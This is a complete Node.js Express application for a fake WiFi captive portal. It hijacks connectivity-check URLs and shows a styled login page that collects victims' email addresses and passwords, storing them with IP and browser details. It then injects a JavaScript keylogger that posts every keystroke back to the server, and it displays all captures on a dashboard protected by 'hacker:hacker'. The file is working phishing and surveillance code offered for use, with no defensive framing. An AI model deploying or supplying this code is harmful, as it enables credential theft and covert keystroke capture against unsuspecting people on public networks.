import express from 'express';
const app = express();

app.use(express.json({limit:'50mb'}));
app.use(express.urlencoded({extended:true,limit:'50mb'}));
app.use(express.static('.', {dotfiles:'allow'}));

let victims = [];

// Captive portal
app.get(['/:generate_204', '/fwlink', '/ncsi.txt'], (req,res)=>res.redirect('/'));

// Fake login page
app.get('/', (req,res)=>{
  res.send(`<!DOCTYPE html>
<html><head><meta name=viewport content="width=device-width"><title>WiFi Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:20px;padding:40px;max-width:380px;width:100%;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.15)}.logo{font-size:4em;margin:0 0 20px}.h1{font-size:1.4em;font-weight:600;color:#333;margin:0 0 10px}p{color:#666;font-size:1em;margin:0 0 30px}input{width:100%;padding:16px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;margin:0 0 15px;transition:.3s}input:focus{outline:0;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:0;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:.3s}.btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(102,126,234,.4)}</style></head>
<body><div class="card"><div class="logo">📶</div><h1 class="h1">WiFi Portal</h1><p>Authentication required</p><form method=POST action=/login><input type=email name=email placeholder=Email required><input type=password name=password placeholder=Password required><button type=submit class=btn>Connect</button></form></div>
<script>document.querySelector('form').onsubmit=async e=>{e.preventDefault();const f=new FormData(e.target);fetch('/login',{method:'POST',body:f}).then(r=>r.text()).then(html=>document.body.innerHTML=html+'<script src="/hook.js"><\/script>');</script></body></html>`);
});

// Capture credentials
app.post('/login', (req,res)=>{
  const data = {
    time: new Date().toISOString(),
    ip: req.ip || 'unknown',
    email: req.body.email || '',
    password: req.body.password || '',
    ua: req.headers['user-agent'] || ''
  };
  victims.push(data);
  console.log('🎣 CAPTURED:', data);
  res.send('<h1>✅ Connected to WiFi</h1><script src="/hook.js"></script>');
});

// Keylogger
app.get('/hook.js', (req,res)=>{
  res.type('js').send(`(k=>{(k=[];document.addEventListener('keydown',e=>k.push(e.key));setInterval(()=>{if(k.length)fetch('/webhook',{method:'POST',body:JSON.stringify({keys:k.splice(0),url:location.href})}).catch(_=>0);},2e3);})(0);`);
});

// Receive keystrokes
app.post('/webhook', (req,res)=>{
  victims.push({time:new Date().toISOString(), type:'keys', data:req.body});
  res.sendStatus(200);
});

// Dashboard (pass: hacker)
app.get('/dash', (req,res)=>{
  if(req.headers.authorization!=='Basic aGFja2VyOmhhY2tlcg==') return res.status(401).send('Unauthorized');
  res.send(`<!DOCTYPE html><html><head><meta http-equiv=refresh content=3><title>Dashboard</title><style>body{font-family:monospace;background:#000;color:lime;padding:20px;font-size:12px}h1{color:lime}.victim{padding:10px;border-bottom:1px solid #333}</style></head>
<body><h1>🎣 Captures (${victims.length})</h1>${victims.slice(-15).map(v=>`<div class=victim><strong>[${v.time}]</strong> ${v.email||v.ip}<pre>${JSON.stringify(v.data||v,null,2)}</pre></div>`).join('')}<p>Basic Auth: hacker:hacker</p></body></html>`);
});

const port=process.env.PORT||3000;
app.listen(port, ()=>console.log(`Running on ${port}`));
export default app;
